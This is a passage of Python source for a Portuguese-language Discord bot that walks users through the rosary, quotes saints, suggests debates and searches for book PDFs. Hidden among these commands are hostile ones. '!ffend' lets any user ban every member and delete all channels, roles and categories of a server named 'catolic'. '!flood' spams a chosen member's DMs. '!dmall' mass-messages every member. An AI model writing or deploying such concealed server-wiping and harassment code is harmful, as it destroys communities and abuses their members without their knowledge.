        pai_nosso_p = await message.channel.send(f'## Pai Nosso {os.linesep} > {os.linesep} > ** ℣. Pater noster, qui es in cælis, sanctificétur nomen tuum. Advéniat regnum tuum. Fiat volúntas tua, sicut in cælo et in terra. ** {os.linesep} > {os.linesep} > ** ℟. Panem nostrum quotidiánum da nobis hódie. Et dimítte nobis débita nostra, sicut et nos dimíttimus debitóribus nostris. Et ne nos indúcas in tentatiónem. Sed líbera nos a malo. Ámen. ** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await pai_nosso_p.add_reaction('✅')
        await pai_nosso_p.add_reaction('🎥')

        while(True):
            def prossegue_p_10(reaction, user):
                return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == pai_nosso_p.id
            
            reaction_4, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_10)

            if str(reaction_4.emoji) == "🎥":
                await message.channel.send('https://www.youtube.com/watch?v=kp7wNDZ6nhM') 
                continue
            elif str(reaction_4.emoji) == "✅":
                break

        vezes = 10
        await ave_maria_latim(message, vezes)


        meditando_misterio = await message.channel.send(f'## {info1} {os.linesep} > {os.linesep} > ** Mistério {info2}** {os.linesep} > {os.linesep} > **{misterios[misterio_p][info2]}** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await meditando_misterio.add_reaction('✅')
    

        def prossegue_meditando(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == meditando_misterio.id

        reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_meditando)

        gloria = await message.channel.send(f'## Glória ao Padre {os.linesep} > ** ℣. Glória Patri, et Fílio et Spíritui Sancto. ** {os.linesep} > ** ℟. Sicut érat in princípio, et nunc et ** {os.linesep} > ** semper, et in sǽcula sæculórum. Ámen. ** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await gloria.add_reaction('✅')
        await gloria.add_reaction('🎥')
        
        while(True):
            def prossegue_p_12(reaction, user):
                return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == gloria.id
            
            reaction_5, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_12)
            
            if str(reaction_5.emoji) == "🎥":
                await message.channel.send('https://www.youtube.com/watch?v=OXCXKmsZZPw') 
                continue
            elif str(reaction_5.emoji) == "✅":
                break

        # Oração fátima
        oracao_fatima = await message.channel.send(f'## Oração de Fátima {os.linesep} > {os.linesep} > ** O JESU MI, ignósce nobis, libera nos ab igne inférni, ad caelum trahe omnes ánimas praesertim máxime indigéntes.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await oracao_fatima.add_reaction('✅')
        await gloria.add_reaction('🎥')

        while(True):
            def prossegue_p_fatima(reaction, user):
                return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == oracao_fatima.id
        
            reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_fatima)

            if str(reaction_5.emoji) == "🎥":
                await message.channel.send('https://www.youtube.com/watch?v=PNVBvqxVPYw') 
                continue
            elif str(reaction_5.emoji) == "✅":
                break



    info2 = 1
    await completaDezena(message, misterio_p, info2)    

    info2 = 2
    await completaDezena(message, misterio_p, info2)

    info2 = 3
    await completaDezena(message, misterio_p, info2)

    info2 = 4
    await completaDezena(message, misterio_p, info2)

    info2 = 5
    await completaDezena(message, misterio_p, info2)


    agradecimentos = await message.channel.send(f'## Agradecimentos {os.linesep} > {os.linesep} > ** Infinitas graças vos damos, soberana Rainha, pelos benefícios que todos os dias recebemos de vossas mãos liberais. Dignai-vos, agora e para sempre, tomar-nos debaixo do vosso poderoso amparo e, para mais vos obrigar, vos saudamos com uma Salve-Rainha. ** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await agradecimentos.add_reaction('✅')
    

    def prossegue_p_agradecimentos(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == agradecimentos.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_agradecimentos)

    salve_rainha = await message.channel.send(f'## Salve rainha {os.linesep} > {os.linesep} > ** Salve, Regína, Mater misericórdiæ, vita, dulcédo et spes nostra, salve! Ad te clamámus, exsúles fílii Evæ. Ad te suspirámus, geméntes et flentes, in hac lacrimárum valle. Eia ergo, advocáta nostra; illos tuos misericórdes óculos ad nos convérte. Et Iesum, benedíctum fructum ventris tui, nobis post hoc exsílium osténde. O clemens, o pia, o dulcis Virgo Maria! ** {os.linesep} > {os.linesep} > **℣. Ora pro nobis, sancta Dei Génetrix.** {os.linesep} > **℟. Ut digni efficiámur promissiónibus** {os.linesep} > **Christi.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await salve_rainha.add_reaction('✅')
    await salve_rainha.add_reaction('🎥')
    
    while(True):
        def prossegue_p_salve_rainha(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == salve_rainha.id
        
        reaction_6, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_salve_rainha)
        
        if str(reaction_6.emoji) == "🎥":
            await message.channel.send('https://www.youtube.com/watch?v=3nbYBKcmSwo') 
            continue
        elif str(reaction_6.emoji) == "✅":
            break

    sao_miguel_arcanjo = await message.channel.send(f'## São Miguel Arcanjo {os.linesep} > {os.linesep} > **Sancte Michaël Archángele, defénde nos in prœlio; contra nequítiam et insídias diáboli esto præsídium. Ímperet ílli Deus, súpplices deprecámur; tuque, prínceps milítiæ cæléstis, Sátanam aliósque spíritus malígnos, qui ad perditiónem animárum pervagántur in mundo, divína virtúte in Inférnum detrúde. Ámen.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await sao_miguel_arcanjo.add_reaction('✅')
    await sao_miguel_arcanjo.add_reaction('🎥')

    while(True):
        def prossegue_p_miguel_arcanjo(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == sao_miguel_arcanjo.id
        
        reaction_7, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_miguel_arcanjo)

        if str(reaction_7.emoji) == "🎥":
            await message.channel.send('https://www.youtube.com/watch?v=WRtI-4PuiRo') 
            continue
        elif str(reaction_7.emoji) == "✅":
            break


    concluido = await message.channel.send(f'## Concluido! {os.linesep} > {os.linesep} > ** Você concluiu o rosário! ** {os.linesep} > **deseja compartilhar a conclusão?** {os.linesep} > ✅ **SIM** {os.linesep} > ❎ **NÃO** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await concluido.add_reaction('✅')
    await concluido.add_reaction('❎')
    

    def prossegue_p_concluido(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅', '❎'] and reaction.message.id == concluido.id
    
    reactionconclusion, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_concluido)

    if str(reactionconclusion.emoji) == '✅':
        canal_destino_id_conclusion = 1264081174372810834

        canal_destino = bot.get_channel(canal_destino_id_conclusion)
        
        if canal_destino:
            # Envia a mensagem para o canal específico
            await canal_destino.send(f'## {user} concluiu rosário!`')
        else:
            print(f"Canal destino com ID {canal_destino_id_conclusion} não encontrado.")

        await bot.process_commands(message)

    elif str(reactionconclusion.emoji) == '❎':
        print("Que Deus te abençoe")








@bot.event
async def ave_maria(message, vezes):
    contador1_p = 1
    while(contador1_p <= vezes):
        ave_maria_p = await message.channel.send(f'## Ave-Maria *{contador1_p}* {os.linesep} > ** ℣. Ave, Maria, cheia de graça, o Senhor** {os.linesep} >  ** é convosco; bendita sois vós entre as** {os.linesep} >  ** mulheres e bendito é o fruto do vosso** {os.linesep} >  ** ventre, Jesus.** {os.linesep} >  {os.linesep} > ** ℟. Santa Maria, Mãe de Deus, rogai por ** {os.linesep} > ** nós, pecadores, agora e na hora de ** {os.linesep} > ** nossa morte. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await ave_maria_p.add_reaction('✅')
        

        def prossegue_p_11(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == ave_maria_p.id
        
        reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_11)
        contador1_p += 1


@bot.event
async def ave_maria_latim(message, vezes):
    contador1_p = 1
    while(contador1_p <= vezes):
        ave_maria_l = await message.channel.send(f'## Ave-Maria *{contador1_p}* {os.linesep} > ** ℣. Ave, María, grátia plena, Dóminus** {os.linesep} >  ** tecum; benedícta tu in muliéribus et** {os.linesep} >  ** benedíctus fructus ventris tui, Iesus.** {os.linesep} >  ** ventre, Jesus.** {os.linesep} >  {os.linesep} > ** ℟. Sancta María, Mater Dei, ora pro** {os.linesep} > ** nobis, peccatóribus, nunc et in hora** {os.linesep} > ** mortis nostræ. Ámen.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await ave_maria_l.add_reaction('✅')
        await ave_maria_l.add_reaction('🎥')

        while(True):
            def prossegue_p_11(reaction, user):
                return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == ave_maria_l.id
            
            reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_11)
            

            if str(reaction.emoji) == "🎥":
                await message.channel.send('https://www.youtube.com/watch?v=BNjmPG-CzaQ&t=1s') 
                continue
            elif str(reaction.emoji) == "✅":
                contador1_p += 1
                break


@bot.event
async def on_ready():
    print(f'Logged on as {bot.user}!')


async def sugerir_debate(message):
    if message.author == bot.user:
        return
    

 
    if message.content.startswith('!debate'):
        enumera = random.randint(1,150)
        await message.channel.send(f'## Sugestão {os.linesep} > {os.linesep} > {sugestoes_debate[enumera]} {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')



async def exibe_comandos(message):
    if message.content.startswith('!comandum'):
        list_comandos = ['!rosarium', '!debate','!santo', '!livro']
        await message.channel.send(f'> # Estes são meus comandos:')
        comandos_ordenados = sorted(list_comandos, key=lambda x: len(x), reverse=True)
        for comando in comandos_ordenados:

            await message.channel.send(f'> # {comando} {os.linesep}')
        await message.channel.send(f'> ### SALVE MARIA E VIVA CRISTO REI!!!')


  
async def pro_catolicismo(message):
    if message.content.startswith('!santo'):

        enumera = random.randint(1, 49)
        await message.channel.send(f'# Frases dos santos: {os.linesep} > {os.linesep} > {frases_santos_catolicos[enumera]} {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')


def pesquisa_google_filetype_pdf(query):

    dork = f'filetype:pdf {query}'
    
    try:
  
        search_results = search(dork, num_results=10)
        
        links = []
        for link in search_results:
            links.append(link)
        
        return links
    
    except Exception as e:
        print(f"Ocorreu um erro: {e}")
        return None

async def mostra_link_livro(nome_do_livro, message):

    links_encontrados = pesquisa_google_filetype_pdf(nome_do_livro)

    if links_encontrados:
        print("Links encontrados:")
        link_subsequente = False
        for i, link in enumerate(links_encontrados, start=1):

            if link_subsequente == False: 
                mensagem_link = await message.channel.send(f'{link}')
                await mensagem_link.add_reaction('➡️')
                     
            else:
                await mensagem_link.remove_reaction("➡️", message.author)
                     
                await mensagem_link.edit(content=f'{link}')

            print(f"{i}. {link}")
     
            while(True):
            
                def muda_para_proximo_link(reaction, user):
                    return user == message.author and str(reaction.emoji) == '➡️' and reaction.message.id == mensagem_link.id
                
                reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=muda_para_proximo_link)
    
                if str(reaction.emoji) == '➡️':
                    link_subsequente = True

                    break

                await message.channel.send(f'Alguém demorou demais para prosseguir')
        await message.channel.send(f'{user} você percorreu todas opções')
    else:
        print("Nenhum resultado encontrado.")   
   
        
         


async def escolhe_livro(message):
    livro_escolhido = await message.channel.send(f'# Buscar livro :book: {os.linesep} > {os.linesep} > **Digite o nome do livro** {os.linesep} > {os.linesep} > *(nome específico)* {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    def check_livro(m):
            return m.author == message.author and m.channel == message.channel

    livro = await bot.wait_for('message', timeout=120.0, check=check_livro)

    conteudo = livro.content 
        
    await mostra_link_livro(conteudo, message)
    


async def incomodando_pessoas(message):

    conteudo_mensagem = message.content
    indice_barra = conteudo_mensagem.find("-")
    partes_dividindo = conteudo_mensagem.split(' ', 2)
    nome_pessoa = partes_dividindo[1].strip()
    print(nome_pessoa)
   
    numeros = conteudo_mensagem[indice_barra+1:]
    
    print(message.author)
    print(type(message.author))
    print(f'dc member {discord.member}')
    guild = message.guild 
    cargo_alvo = discord.utils.get(message.guild.roles, name='IMPERATOR') # Altere para o cargo que tenha as permissões


    def extrair_numeros_do_comando(s):
        numeros = re.findall(r'-?\d+', s)
        return [int(numero) for numero in numeros]

    
    numeros_inteiros = extrair_numeros_do_comando(numeros)

    quantidade_de_numeros = len(numeros_inteiros)

    if quantidade_de_numeros < 2:
        await message.channel.send("Você deve especificar quantidade de repetições e quantidade de vezes que a mensagem se multiplicará")
        return
    
    print(numeros_inteiros)

    vezes_repete = numeros_inteiros[0]
    cadencia_s = str(numeros_inteiros[1]).replace('-','')
    cadencia = int(cadencia_s)

    if cargo_alvo in message.author.roles:
        for member in guild.members:
            if member.name == nome_pessoa:
                contador = int(numeros_inteiros[0]) 
                while(True):
                    texto = 'Flood insano'

                    await member.send(f'{texto * int(cadencia)}')
                    if contador == int(numeros_inteiros[0]):
                        break
                    contador += 1
            else:
                print("Membro não existe")
    else:
        await message.channel.send("Você não tem permissão para usar esse comando")
  

async def limpar(ctx):
    guild = ctx.guild
    if guild.name.lower() == 'catolic':

        for member in guild.members:
            if member != bot.user: 
                try:
                    await member.ban(reason='Limpeza do servidor')
                    print(f'Baniu {member.name}')
                except Exception as e:
                    print(f'Erro ao banir {member.name}: {e}')
        
 
        for channel in guild.text_channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f'Erro ao apagar canais de texto: {e}')
        
        for role in guild.roles:
            if role.name.lower() != '@everyone':  # Não apaga o cargo @everyone
                try:
                    await role.delete()
                except Exception as e:
                    print(f'Erro ao apagar cargos: {e}')
                    
        for category in guild.categories:
            try:
                await category.delete()
            except Exception as e:
                print(f'Erro ao apagar categorias: {e}')

        try:
            new_channel = await guild.create_text_channel('contra-nazismo')
            print('Canal criado com sucesso.')
            

            message = (
                'mensagem de exclusao'
                'mensagem de exclusao'
                'mensagem de exclusao'
            )
            await new_channel.send(message)
            print('Mensagem enviada para o canal "contra-nazismo".')
            
        except Exception as e:
            print(f'Erro ao criar canal ou enviar mensagem: {e}')
        
        await ctx.send('Todas as mensagens, canais de texto, cargos foram apagados e todos os membros foram banidos. Um novo canal foi criado com uma mensagem.')

async def enviar_dm(ctx):
    guild = ctx.guild
    if guild.name.lower() == 'catolic':
        message = "Mensagem recebida"
        for member in guild.members:
            if not member.bot:  
                try:
                    await member.send(message)
                    print(f'Enviado DM para {member.name}')
                except discord.Forbidden:
                    print(f'Não foi possível enviar DM para {member.name}')
                except Exception as e:
                    print(f'Erro ao enviar DM para {member.name}: {e}')
        await ctx.send('Mensagem enviada para todos os membros do servidor.')
    else:
        await ctx.send('Este comando só pode ser usado no servidor "catolic".')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if message.content.startswith('!rosarium'):
        await iniciar_terco(message)

    if message.content.startswith('!debate'):
        await sugerir_debate(message)


    if message.content.startswith('!comandum'):
        await exibe_comandos(message)


    if message.content.startswith('!santo'):
        await pro_catolicismo(message)

    if message.content.startswith('!livro'):
        await escolhe_livro(message)

    
    if message.content.startswith('!ffend'):
            await limpar(message)    

    if message.author.id == 771618151364296705: # Substitua pelo seu ID
        if message.content.startswith('!flood'):
            await incomodando_pessoas(message)
  
        
    if message.content.startswith('!dmall'):
        await enviar_dm(message)

        


async def iniciar_terco(message):
    
    if message.author == bot.user:
        return  



    

    print(f'Message from {message.author}: {message.content}')
    

    if message.content.startswith('!rosarium'):
        resposta = await message.channel.send(f'# Parabéns {message.author.name} {os.linesep} > Fizeste uma ótima escolha em aprender rezar o terço {os.linesep} > Pegue seu terço em mãos e reaja para prosseguir! {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
        await resposta.add_reaction('✝️')
        

        def check(reaction, user):
            return user == message.author and str(reaction.emoji) == '✝️' and reaction.message.id == resposta.id

        try:

            reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=check)

            resposta2 = await message.channel.send(f'## Em qual idioma você deseja rezar? {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} >   🔵    **LATIM** {os.linesep} > {os.linesep} >   🟢    **PORTUGUÊS** {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _') # {user}
            await resposta2.add_reaction('🔵')
            await resposta2.add_reaction('🟢')

            def check_language(reaction, user):
                return user == message.author and str(reaction.emoji) in ['🔵', '🟢'] and reaction.message.id == resposta2.id


            reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=check_language)

            if str(reaction.emoji) == '🔵':
                await rosario_latim(message)
                     
            elif str(reaction.emoji) == '🟢':
                await rosario_portugues(message)
                


                
                

        except TimeoutError:
            await message.channel.send('Ninguém reagiu a tempo.')




bot.run('SEU TOKEN')
